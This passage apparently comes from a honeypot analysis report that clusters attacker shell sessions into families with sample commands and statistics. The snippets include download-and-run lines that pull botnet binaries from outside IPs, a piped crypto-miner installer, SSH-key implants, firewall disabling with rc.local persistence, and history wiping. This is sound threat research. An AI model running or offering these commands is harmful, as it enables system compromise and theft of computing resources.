chmod 777 bin.x86
./bin.x86 x86boot
rm -rf bin.x86
rm -rf *
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('cd', 30), ('rm', 10), ('wget', 6), ('chmod', 6), ('history', 6), ('curl', 5), ('PH_EXEC_1', 4), ('sh', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 32777bc4e28224a2 | 48ac65564ea0 |        8 |               1 |
| 3d9a1ce56f625f76 | df6c445d19e7 |        7 |               1 |
| 568871dfc24b70e2 | 5cbd925391eb |        7 |               1 |
| 6121a167e7aecc33 | a9507d3a918b |        8 |               1 |
| 82cf64cccee00412 | 5ae4304320f7 |        7 |               1 |
| ed651b07205449c7 | 28633f947a29 |        8 |               1 |

---

## Family 45

- **Total Session Volume**: 6
- **FI-Unique Archetypes**: 6
- **Mean FS**: 0.831 (±0.088)
- **Medoid Archetype**: `e99164874147749a` (Session: `288e6acb32f1`, n_rows=8)

**Medoid Execution Snippet:**
```text
w
uname -m
cat /proc/cpuinfo | grep model | grep name | wc -l
top
uname
uname -a
lscpu | grep Model
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', 'EOS')]`

Top operators: [('grep', 19), ('uname', 17), ('cd', 12), ('cat', 6), ('wc', 6), ('top', 6), ('lscpu', 6), ('rm', 6), ('mkdir', 6), ('echo', 6)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 076f8c1c945c94ab | e4c5a67c8066 |       11 |               1 |
| 4ae0530af882a0b1 | 08ad6ce326c3 |        6 |               1 |
| 6b7aee65dad7ffc7 | 58e37256c2d8 |        9 |               1 |
| a2a17b83eac6dc90 | 502a10699dc6 |       12 |               1 |
| cd8711ad1f885b20 | 91f2e57955ab |        7 |               1 |
| e99164874147749a | 288e6acb32f1 |        8 |               1 |

---

## Family 135

- **Total Session Volume**: 6
- **FI-Unique Archetypes**: 5
- **Mean FS**: 0.915 (±0.044)
- **Medoid Archetype**: `503227216529f352` (Session: `7932c755f1af`, n_rows=15)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /sys || cd /bin || cd /mnt || cd /root || cd /
wget http://109.104.151.108/mtr.sh
busybox wget http://109.104.151.108/mtr.sh
curl -O http://109.104.151.108/mtr.sh
chmod +x mtr.sh
sh mtr.sh
rm -rf mtr.sh
tftp 109.104.151.108 -c get mtr1.sh
chmod 777 mtr1.sh
sh mtr1.sh
tft ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('tftp', ';'), ('chmod', ';'), ('tftp', ';'), ('chmod', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('cd', 35), ('chmod', 15), ('sh', 12), ('tftp', 10), ('rm', 8), ('wget', 5), ('curl', 5), ('history', 5), ('busybox', 3), ('PH_EXEC_2', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 503227216529f352 | 7932c755f1af |       15 |               2 |
| 44e4cfcefeb2c317 | 7ecd5f071a36 |       13 |               1 |
| 68df4aec7695f9f0 | 0143ba53d941 |       14 |               1 |
| b85d2fc773d0aaac | a24d9586fb87 |       14 |               1 |
| e2b2485e3993d1fc | ca0b4d28a49d |       15 |               1 |

---

## Family 19

- **Total Session Volume**: 6
- **FI-Unique Archetypes**: 5
- **Mean FS**: 0.842 (±0.057)
- **Medoid Archetype**: `57076ce3c958c76a` (Session: `c704d2bcf1b7`, n_rows=16)

**Medoid Execution Snippet:**
```text
cat /proc/mounts
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>//.a && cd /
>/proc/.a && cd /proc
>/dev/.a && cd /dev
>/run/.a && cd /run
wget --help
curl --help
ftpget --help
echo -e '\x48\x41\x53\x5f\x45\x43\x48\x4f';wget --help
curl http://2.58.149.116/spc > ntp ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('ftpget', ';'), ('echo', ';')]`

Top operators: [('>', 40), ('cd', 40), ('wget', 10), ('curl', 8), ('cat', 5), ('ftpget', 5), ('echo', 5), ('chmod', 3), ('PH_EXEC_1', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7acc61b6f981020c | 7fdccbcc9042 |       17 |               2 |
| 0465df4be181f6ef | 5afaaa2d340d |       14 |               1 |
| 10fed3efde59f353 | ee73bbe30f82 |       15 |               1 |
| 57076ce3c958c76a | c704d2bcf1b7 |       16 |               1 |
| 72588f0f80cad226 | 9456367bfaee |       12 |               1 |

---

## Family 97

- **Total Session Volume**: 6
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.931 (±0.020)
- **Medoid Archetype**: `3604dd841d3e21fa` (Session: `3771d322e18d`, n_rows=8)

**Medoid Execution Snippet:**
```text
cd /tmp
cd /dev
cd /mnt
cd /var
rm -rf sh
wget http://185.28.39.119/sh || curl -O http://185.28.39.119/sh || tftp 185.28.39.119 -c get sh || tftp -g -r sh 185.28.39.119
chmod 777 sh;./sh nfxisgang
rm -rf sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('cd', ';'), ('cd', ';'), ('cd', ';'), ('rm', ';'), ('wget', '||'), ('curl', '||'), ('tftp', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 12), ('rm', 6), ('tftp', 5), ('wget', 3), ('curl', 3), ('chmod', 3), ('PH_EXEC_1', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3604dd841d3e21fa | 3771d322e18d |        8 |               4 |
| 39edbd853d9ba478 | 74921c598e8d |        8 |               1 |
| 6ef92ddfce5d4c55 | 8b2c88bec51b |        9 |               1 |

---

## Family 55

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 5
- **Mean FS**: 0.892 (±0.082)
- **Medoid Archetype**: `4161dff02b5650a1` (Session: `73d6c0fff02d`, n_rows=43)

**Medoid Execution Snippet:**
```text
enable
development
system
shell
sh
runshellcmd
linuxshell
runshellcmd
start start-shell
start-shell
start-shell bash
ping
sh
vshell
exec shellconfig
config terminal
busybox DNXFCOW
/bin/busybox DNXFCOW
/bin/busybox DNXFCOW
>/tmp/.file && cd /tmp/
>/var/.file && cd /var/
>/dev/.file && cd /dev/
>/mnt ...
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('development', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('runshellcmd', ';'), ('linuxshell', ';'), ('runshellcmd', ';'), ('start', ';'), ('start-shell', ';'), ('start-shell', ';'), ('ping', ';'), ('sh', ';'), ('vshell', ';'), ('exec', ';'), ('config', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', ';'), ('busybox', ';')]`

Top operators: [('>', 83), ('cd', 75), ('busybox', 48), ('sh', 10), ('runshellcmd', 10), ('start-shell', 10), ('enable', 5), ('development', 5), ('system', 5), ('shell', 5)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 273cab0a2b5d9aad | 45c58e7754d0 |       39 |               1 |
| 4161dff02b5650a1 | 73d6c0fff02d |       43 |               1 |
| 4268202121743d85 | 340d6d2f3fcc |       43 |               1 |
| 6929c71162f2304d | 234fafb10e53 |       39 |               1 |
| f31a06df4df15734 | 644fbcc7f5a0 |       55 |               1 |

---

## Family 179

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.880 (±0.059)
- **Medoid Archetype**: `34f7ea52433a361e` (Session: `242c728481e0`, n_rows=9)

**Medoid Execution Snippet:**
```text
sh
shell
ls /
cd /tmp
wget http://104.244.76.7/jack5tr.sh
busybox wget wget http://104.244.76.7/jack5tr.sh
chmod 777 jack5tr.sh
sh jack5tr.sh
rm -f jack5tr.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('ls', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('rm', 'EOS')]`

Top operators: [('sh', 7), ('rm', 5), ('shell', 4), ('ls', 4), ('cd', 4), ('wget', 4), ('chmod', 4), ('busybox', 2), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| deeaccfd5e0b43df | 0b1ba1e85831 |        9 |               2 |
| 34f7ea52433a361e | 242c728481e0 |        9 |               1 |
| 55ff4d70e37533b0 | d6345daabe35 |        8 |               1 |
| 696f387e21a6e529 | 73b1f5841a82 |        8 |               1 |

---

## Family 67

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.854 (±0.086)
- **Medoid Archetype**: `1dac8f640596347c` (Session: `4d2bdf7cd955`, n_rows=4)

**Medoid Execution Snippet:**
```text
wget http://cnc.cyberproperty.us/bins.sh
chmod 777 bins.sh
sh bins.sh
rm -rf * ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('chmod', ';')]`

Top operators: [('wget', 4), ('chmod', 4), ('rm', 3), ('sh', 2), ('PH_EXEC_1', 2), ('lscpu', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 3950b1fe64443d3b | 1e3615ddeeae |        4 |               2 |
| 1dac8f640596347c | 4d2bdf7cd955 |        4 |               1 |
| 32c1e38bb5d413a8 | 984eb3d2eb43 |        4 |               1 |
| bd66b11ce697d83c | a9f816b1d0df |        4 |               1 |

---

## Family 8

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.835 (±0.096)
- **Medoid Archetype**: `110f44403db89efd` (Session: `4df4aa6f6318`, n_rows=13)

**Medoid Execution Snippet:**
```text
uname -a
nproc;wget -4 --no-check-certificate https://dijkstra.do.am/files/test
curl -O https://dijkstra.do.am/files/test
dget -4 --no-check-certificate https://dijkstra.do.am/files/test
tar -xzf test
rm -f test
cd ./-s;./.s
sleep 50
rm -rf ./-s
rm -rf /dev/shm/c3pool /root/c3pool
pkill -f xmrig
rm  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('wget', ';'), ('curl', ';'), ('dget', ';'), ('tar', ';'), ('rm', ';'), ('cd', ';'), ('PH_EXEC_2', ';'), ('sleep', ';'), ('rm', ';'), ('rm', ';'), ('kill', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('rm', 17), ('wget', 5), ('uname', 4), ('curl', 4), ('dget', 4), ('tar', 4), ('cd', 4), ('PH_EXEC_2', 4), ('sleep', 4), ('kill', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5905342d65f2100d | db07bd4a4d64 |       14 |               2 |
| 110f44403db89efd | 4df4aa6f6318 |       13 |               1 |
| 8d2e153ccda1ca2e | 87b3487ae72f |       13 |               1 |
| c03db437ecfe28e1 | b9a751c9c45b |       17 |               1 |

---

## Family 29

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.819 (±0.057)
- **Medoid Archetype**: `dd7e9b53274fa07c` (Session: `22c87f04d3d3`, n_rows=5)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /
wget -q http://209.141.40.31/bins/x86
curl -O http://209.141.40.31/bins/x86
chmod 777 *
./x86 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', ';'), ('wget', ';'), ('PH_EXEC_1', 'EOS')]`

Top operators: [('cd', 8), ('wget', 4), ('PH_EXEC_1', 4), ('chmod', 3), ('curl', 2), ('cat', 1), ('x86', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b4ae8c19188119f2 | a58f353f6b14 |        4 |               2 |
| 186aa48ffac79921 | 4b68d8da2bbd |        5 |               1 |
| 6c02e9af1a109eeb | 340f6279195d |        5 |               1 |
| dd7e9b53274fa07c | 22c87f04d3d3 |        5 |               1 |

---

## Family 7

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.805 (±0.073)
- **Medoid Archetype**: `bb69c7c7499f50dc` (Session: `783168fdc3fc`, n_rows=83)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
/bin/busybox DMSNA
/bin/busybox mkdir /tmp/
>/tmp/.file && cd /tmp/
/bin/busybox rm -rf .file .z .x
/bin/busybox mkdir /var/
>/var/.file && cd /var/
/bin/busybox rm -rf .file .z .x
/bin/busybox mkdir /dev/
>/dev/.file && cd /dev/
/bin/busybox rm -rf .file .z .x
/bin/busybox mk ...
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', 'EOS')]`

Top operators: [('busybox', 190), ('>', 88), ('cd', 57), ('PH_EXEC_2', 20), ('sh', 18), ('PH_EXEC_1', 9), ('rm', 6), ('shell', 5), ('enable', 4), ('system', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| bb69c7c7499f50dc | 783168fdc3fc |       83 |               2 |
| 2f9746f338279c06 | c201422e15d5 |       72 |               1 |
| 68f75fcaed71496b | cb6fb9b37841 |       81 |               1 |
| ba43c7349df6b0d5 | 86f5b52b4873 |       83 |               1 |

---

## Family 15

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.792 (±0.042)
- **Medoid Archetype**: `6b2a0980ceaaa4aa` (Session: `32efa1b0e1fe`, n_rows=8)

**Medoid Execution Snippet:**
```text
#!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://23.235.171.196:1211/112
curl -O http://23.235.171.196:1211/112
chmod +x 112
./112
rm -rf 123.sh
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('curl', ';'), ('chmod', ';')]`

Top operators: [('wget', 4), ('curl', 4), ('chmod', 4), ('rm', 4), ('PH_EXEC_1', 3), ('history', 1), ('sh', 1), ('PH_EXEC_2', 1), ('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6b2a0980ceaaa4aa | 32efa1b0e1fe |        8 |               2 |
| 52636645a3c69cb0 | e093984dd508 |        5 |               1 |
| 6ceafe2d78370f7e | 01a7825f9eed |        6 |               1 |
| 834eaf6a320f0ead | 062c614c83a2 |        8 |               1 |

---

## Family 316

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 3
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0244ddd561590d87` (Session: `9a6eb9903bf5`, n_rows=7)

**Medoid Execution Snippet:**
```text
cat /etc/issue
cd /tmp
rm -rf x86_64
wget http://45.14.149.244/x86_64
chmod 777 x86_64
./x86_64 x86hxed
echo firewalla1337 and Anarchy were here ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('cd', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('echo', 'EOS')]`

Top operators: [('cat', 3), ('cd', 3), ('rm', 3), ('wget', 3), ('chmod', 3), ('PH_EXEC_1', 3), ('echo', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0244ddd561590d87 | 9a6eb9903bf5 |        7 |               2 |
| 4b4ca36635d46ee5 | c47c80927c2f |        7 |               2 |
| 7622182ab69e231d | 5d0884d9682c |        7 |               1 |

---

## Family 111

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.944 (±0.039)
- **Medoid Archetype**: `9b9c818b777c271d` (Session: `a32017ac94d1`, n_rows=13)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
linuxshell
cd /tmp/
echo "senpai" > rootsenpai
cat rootsenpai
rm -rf rootsenpai
rm -rf shr
wget http://46.23.109.47/shr || curl -O http://46.23.109.47/shr || tftp 46.23.109.47 -c get shr || tftp -g -r shr 46.23.109.47
chmod 777 shr;./shr ssh
rm -rf shr ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('linuxshell', ';'), ('cd', ';'), ('echo', ';'), ('cat', ';'), ('rm', ';'), ('rm', ';'), ('wget', '||'), ('curl', '||'), ('tftp', '||'), ('tftp', ';'), ('chmod', ';'), ('rm', 'EOS')]`

Top operators: [('rm', 10), ('tftp', 6), ('enable', 3), ('system', 3), ('shell', 3), ('sh', 3), ('linuxshell', 3), ('cd', 3), ('echo', 3), ('cat', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9b9c818b777c271d | a32017ac94d1 |       13 |               2 |
| e889171a408b3f4d | b436188d1265 |       13 |               2 |
| e8a224ef7f599e4d | 2e89a956f1f1 |       14 |               1 |

---

## Family 158

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.926 (±0.052)
- **Medoid Archetype**: `6bca1bbde2b7d5fa` (Session: `1f2a7990a1c3`, n_rows=9)

**Medoid Execution Snippet:**
```text
start
enable
config terminal
system
linuxshell
shell
sh
echo -e '\x6C\x72\x6C\x6D\x6F'
printf '\x6C\x72\x6C\x6D\x6F' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('start', ';'), ('enable', ';'), ('config', ';'), ('system', ';'), ('linuxshell', ';'), ('shell', ';'), ('sh', ';')]`

Top operators: [('start', 3), ('enable', 3), ('config', 3), ('system', 3), ('linuxshell', 3), ('shell', 3), ('sh', 3), ('echo', 3), ('printf', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 10393509baa3bf01 | 0dd54336bbf7 |        8 |               3 |
| 6bca1bbde2b7d5fa | 1f2a7990a1c3 |        9 |               1 |
| c86b8a74f2a8f1ee | e7ef452238b6 |        9 |               1 |

---

## Family 118

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.875 (±0.000)
- **Medoid Archetype**: `25540125dd5a4bbd` (Session: `4c44b453b8f0`, n_rows=3)

**Medoid Execution Snippet:**
```text
uname -a
hostname
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('curl', '|'), ('bash', 'EOS')]`

Top operators: [('uname', 2), ('curl', 2), ('bash', 2), ('hostname', 1), ('cd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 33483cb59515ea9a | 0806ca7f4b70 |        2 |               4 |
| 25540125dd5a4bbd | 4c44b453b8f0 |        3 |               1 |

---

## Family 58

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.867 (±0.000)
- **Medoid Archetype**: `6e6b2a9489b44995` (Session: `239968f712f2`, n_rows=4)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';')]`

Top operators: [('echo', 5), ('cd', 4), ('passwd', 3), ('rm', 2), ('mkdir', 2), ('chmod', 2), ('cat', 2), ('grep', 2), ('wc', 2), ('bash', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 86220645596670ee | 3f7ea0ddada2 |        5 |               3 |
| 6e6b2a9489b44995 | 239968f712f2 |        4 |               2 |

---

## Family 174

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `a0b817ff6d201f8e` (Session: `5f3f5ff1d484`, n_rows=51)

**Medoid Execution Snippet:**
```text
mkdir -p /home/user/.ssh/
echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6apTpBLxylca9D2EVjfr8xa6OadS2c0oR4RYLkJiIp2XoWkJKqxVodz0s2gfQrMb9qr3oJQVoT4M1WHd829D5Wu2kJY4RMFSo+Rb2dszg0PQJ5Ug1pEW1DedYR379sjoIiF/qbaDzq3FtkUx9+5E/BiqdMGyncml3yinN6HuNH+Fnhv6TtS45Re6gI1rA21qFguBF5U3yPFKeF5ElH997x/0rf3Qr01v38F299 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('mkdir', ';'), ('echo', ';'), ('echo', ';'), ('uname', ';'), ('echo', ';'), ('uptime', ';'), ('echo', ';'), ('w', ';'), ('echo', ';'), ('who', ';'), ('echo', ';'), ('last', ';'), ('echo', ';'), ('lastlog', ';'), ('echo', ';'), ('cat', ';'), ('echo', ';'), ('ls', ';'), ('echo', ';'), ('cat', ';'), ('echo', ';'), ('sudo', ';'), ('echo', ';'), ('ps', ';'), ('echo', ';'), ('netstat', ';'), ('echo', ';'), ('PH_EXEC_1', ';'), ('echo', ';'), ('PH_EXEC_2', ';'), ('echo', ';'), ('cat', ';'), ('echo', ';'), ('cat', ';'), ('echo', ';'), ('cat', ';'), ('echo', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('cat', ';'), ('echo', ';'), ('cat', ';'), ('echo', ';'), ('cat', ';'), ('echo', ';'), ('sudo', '&&'), ('sudo', ';'), ('echo', ';'), ('crontab', ';'), ('echo', ';'), ('exit', 'EOS')]`

Top operators: [('echo', 24), ('cat', 11), ('sudo', 3), ('mkdir', 1), ('uname', 1), ('uptime', 1), ('w', 1), ('who', 1), ('last', 1), ('lastlog', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a0b817ff6d201f8e | 5f3f5ff1d484 |       51 |               5 |

---

## Family 200

- **Total Session Volume**: 5
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `bc787de6400551d6` (Session: `3a3e4c0998c8`, n_rows=10)

**Medoid Execution Snippet:**
```text
/etc/init.d/iptables stop
service iptables stop
SuSEfirewall2 stop
reSuSEfirewall2 stop
cd /tmp
wget -c http://222.186.133.160:8090/sudo
chmod 777 sudo;./sudo
echo "cd /tmp/">>/etc/rc.local
echo "./sudo&">>/etc/rc.local
echo "/etc/init.d/iptables stop">>/etc/rc.local ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('systemctl', ';'), ('SuSEfirewall2', ';'), ('reSuSEfirewall2', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('echo', ';'), ('echo', ';'), ('echo', 'EOS')]`

Top operators: [('echo', 3), ('PH_EXEC_1', 1), ('systemctl', 1), ('SuSEfirewall2', 1), ('reSuSEfirewall2', 1), ('cd', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_2', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| bc787de6400551d6 | 3a3e4c0998c8 |       10 |               5 |

---

## Family 42

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.924 (±0.035)
- **Medoid Archetype**: `ab84fc0bec1e33ad` (Session: `ebffbd343dde`, n_rows=17)

**Medoid Execution Snippet:**
```text
shell
cd /tmp
rm -rf wget.sh
wget http://192.3.80.137/wget.sh
chmod +x wget.sh
sh wget.sh
rm -rf wget.sh
rm -rf curl.sh
curl -O http://192.3.80.137/curl.sh
chmod +x curl.sh
sh curl.sh
rm -rf curl.sh
rm -rf tftp.sh
tftp -g 192.3.80.137 -r tftp.sh
chmod +x tftp.sh
sh tftp.sh
rm -rf tftp.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', 'EOS')]`

Top operators: [('rm', 24), ('chmod', 12), ('sh', 12), ('cd', 7), ('wget', 4), ('curl', 4), ('tftp', 4), ('shell', 3), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 030006dd8383f36e | 1e6c86d6d94c |       17 |               1 |
| 2c6944a0c42f64c3 | d59ef74c5774 |       17 |               1 |
| ab84fc0bec1e33ad | ebffbd343dde |       17 |               1 |
| d956b45c823a6b96 | 62af8432179f |       17 |               1 |

---

## Family 302

- **Total Session Volume**: 4
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.905 (±0.034)
- **Medoid Archetype**: `9782fb0385ecb7c3` (Session: `a60620cf1568`, n_rows=7)

**Medoid Execution Snippet:**
```text
cd /tmp
wget http://208.115.245.158/c --no-check-certificate
curl -O http://208.115.245.158/c
chmod 777 c*
./c
rm -rf -c*
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('curl', ';'), ('chmod', ';'), ('rm', ';'), ('history', 'EOS')]`

